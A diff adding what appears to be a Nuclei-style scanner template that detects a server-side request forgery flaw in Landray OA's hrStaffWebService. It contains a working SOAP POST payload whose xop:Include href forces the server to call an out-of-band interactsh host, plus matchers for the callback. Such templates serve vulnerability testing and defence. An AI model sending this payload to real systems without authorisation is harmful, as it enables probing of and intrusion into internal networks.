@@ -1,0 +1,39 @@
+id: poc-yaml-landray-hrstaffwebservice-ssrf
+info:
+  name: Landray OA hrStaffWebService SSRF
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,ssrf
+http:
+  - raw:
+      - |
+        POST /sys/webservice/hrStaffWebService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/related; boundary=----frhpvivnctknnkiwugaq
+
+        ------frhpvivnctknnkiwugaq
+        Content-Disposition: form-data; name="1"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.staff.hr.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getHrStaffElements>
+                <arg0>
+                    <beginTimeStamp>1</beginTimeStamp>
+                    <count><xop:Include 
+        xmlns:xop="http://www.w3.org/2004/08/xop/include" 
+        href="https://{{interactsh-url}}"/></count>
+                </arg0>
+            </web:getHrStaffElements>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------frhpvivnctknnkiwugaq--
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "href\\s*=\\s*\\\"https://{{interactsh-url}}\\\""
